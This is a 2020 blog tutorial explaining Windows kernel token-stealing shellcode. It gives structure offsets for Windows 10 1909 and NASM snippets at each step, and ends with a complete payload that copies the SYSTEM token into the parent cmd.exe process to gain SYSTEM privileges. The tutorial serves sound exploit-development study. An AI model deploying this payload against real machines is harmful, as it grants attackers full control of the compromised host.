---
draft: false
date: 2020-02-03T16:25:30+01:00
title: "Windows Kernel Shellcode : TokenStealer"
description: "the Process Token Replacement Shellcode, the concept revolves around locating a privileged process and transferring its token to an unprivileged process."
slug: "windows-kernel-shellcode-tokenstealer"
authors: ["Oussama Amri"]
tags: ["windows", "exploit", "shellcode", "kernel", "token"]
categories: []
externalLink: ""
series: []
aliases: ["/post/windows-kernel-shellcode-tokenstealer/"]
---

A typical approach involving Reverse/Bind shellcode won't prove effective for Windows Kernel Exploitation. More often than not, practitioners resort to techniques such as Nulling out ACLs, Enabling privileges or Replacing process token.

### TL;DR
This article concentrates primarily on the **"Process Token Replacement"** Shellcode. The concept revolves around locating a privileged process and transferring its token to an unprivileged process, usually the parent process. (It's important to note that an exploit (**exploit.exe**) is executed through a command line (**cmd.exe**), which acts as the parent process.)

To summarize the steps:

- Identify the EPROCESS address of the current process.
- Pinpoint the EPROCESS address of the parent process.
- Locate the EPROCESS address of the SYSTEM process.
- Duplicate the token from the SYSTEM process to the parent process.
- Attain control over NT AUTHORITY/SYSTEM privileges.

For experimentation, ensure you're in a context where you have the ability to execute arbitrary kernel mode code and assembly code.

> Please be aware that the offsets need adjustment depending on the Windows build number you're working with! Refer to https://www.vergiliusproject.com/ for further information.

### Step 1

In our shellcode we need to start by locating the `_KTHREAD* CurrentThread` structure of the current process, let's see step by step how to find it !

The `GS[0]` segment point at the [_KPCR](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KPCR) (Kernel Processor Control Region) structure which contains information about the processor.

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/KPCR.PNG" width="70%" >}}

In the last field of `KPCR`, exactly in `GS[0x180]` segment we can find the [_KPRCB](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KPRCB) (Kernel Processor Control Region Block) structure which contains information about the current Thread.

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/KPRCB.PNG" width="70%" >}}

As you can see the offset `0x08` of `KPRCB` point at a [_KTHREAD* CurrentThread](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KTHREAD) structure of the CurrentThread, which is at `GS[0x188]`. So first instruction in assembly will be : 

```nasm
mov r9, qword [gs:0x188]  ; Pointing at _KTHREAD structure
```
### Step 2 

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/KTHREAD.PNG" width="70%" >}}

What we care more about in the `_KTHREAD` structure is the offset `0x220` where we can find the [_KPROCESS* Process](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KPROCESS) structure. 

```nasm
mov r9, qword [r9 + 0x220]  ; Pointing at _KPROCESS/_EPROCESS structure
```

> The _KPROCESS structure is first field in the [_EPROCESS](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_EPROCESS) structure. So the address of _KPROCESS is the same as the address of _EPROCESS.

### Step 3

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/EPROCESS.PNG" width="70%" >}}

As we can see the offset `0x3e8` from the `_EPROCESS` point at the `InheritedFromUniqueProcessId` which is the **parent PID** (cmd.exe in our case).

```nasm
mov r8, qword [r9 + 0x3e8]  ; Saving the Parent PID in r8
mov rax, r9                 ; Saving the _KPROCESS/_EPROCESS address
```

#### To summarize

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/EPROCESS-MAP.png">}}


### Step 4

Now we have the parent PID, it's time to look for the `_EPROCESS` structure associated to it !

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/PID.PNG" width="70%" >}}

The offset `0x2f0` point at the `_LIST_ENTRY ActiveProcessLinks` structure, which is a linked-list points at the beginning of `_EPROCESS` structure for each **Active Process**. 

So we need loop over them and each time we compare the PID value with the `VOID* UniqueProcessId` (offset `0x2e8`), until we find the right `_EPROCESS` of the parent PID.

```nasm
loop1:
mov rax, qword [rax + 0x2f0]  ; Next ActiveProcessLinks Entry
sub rax, 0x2f0                ; Point in the beginning of _EPROCESS structure
cmp qword [rax + 0x2e8], r8   ; Compare the saved Parent PID with the UniqueProcessId
jne loop1
```
### Step 5

Once we found the right `_EPROCESS` structure, we need to save the address that point at the `_EX_FAST_REF Token` (offset `0x360`), which is the token that need to be replaced.

```nasm
mov rcx, rax    ; Copy the _EPROCESS address to RCX
add rcx, 0x360  ; Pointing RCX at Token
```
### Step 6

We need to do the same thing with a **privileged process**. Most of the time we use the `system` process (PID of `4`).

```nasm
loop2:
mov rax, qword [rax + 0x2f0]  ; Next ActiveProcessLinks Entry
sub rax, 0x2f0                ; Pointing in the beginning of _EPROCESS
cmp qword [rax + 0x2e8], 0x4  ; Compare the PID (4) with the UniqueProcessId
jne loop2
```

### Step 7

After we find the `_EPROCESS` structure of the privileged process, it's time to replace the token of the unprivileged process (Parent PID **cmd.exe**) with the token of the privileged process **system**.

```nasm
mov rdx, rax            ; Pointing RDX at the beginning of _EPROCESS of system
add rdx, 0x360          ; Pointing RDX at the Token of system
mov rdx, qword [rdx]    ; Copying the Token
mov qword [rcx], rdx    ; Replace the cmd.exe Token with the system Token
ret
```
### Exploit

{{< figure src="/img/windows-kernel-shellcode-tokenstealer/SYSTEM.PNG" width="90%" >}}

### Final Code

```nasm
[bits 64]
global _start

section .text

_start:
mov r9, qword [gs:0x188]     ; Pointing at _KTHREAD structure
mov r9, qword [r9 + 0x220]   ; Pointing at _KPROCESS/_EPROCESS structure
mov r8, qword [r9 + 0x3e8]   ; Saving the Parent PID in r8 / you can change it directly with a PID value from your choice !
mov rax, r9                  ; Saving the _KPROCESS/_EPROCESS address
loop1:
mov rax, qword [rax + 0x2f0] ; Next ActiveProcessLinks Entry
sub rax, 0x2f0               ; Point in the beginning of _EPROCESS structure
cmp qword [rax + 0x2e8], r8  ; Compare the saved Parent PID with the UniqueProcessId
jne loop1
mov rcx, rax                 ; Copy the _EPROCESS address to RCX
add rcx, 0x360               ; Pointing RCX at Token
mov rax, r9
loop2:
mov rax, qword [rax + 0x2f0] ; Next ActiveProcessLinks Entry
sub rax, 0x2f0               ; Pointing in the beginning of _EPROCESS
cmp qword [rax + 0x2e8], 0x4 ; Compare the PID (4) with the UniqueProcessId
jne loop2
mov rdx, rax                 ; Pointing RDX at the beginning of _EPROCESS of system
add rdx, 0x360               ; Pointing RDX at the Token of system
mov rdx, qword [rdx]         ; Copying the Token
mov qword [rcx], rdx         ; Replace the cmd.exe Token with the system Token
ret
```

#### References:
* [Improsec](https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-1)
* [Cesar Cerrudo in 2012](https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)
* [InfoSecInstitute](https://resources.infosecinstitute.com/kernel-exploitation-part-2/)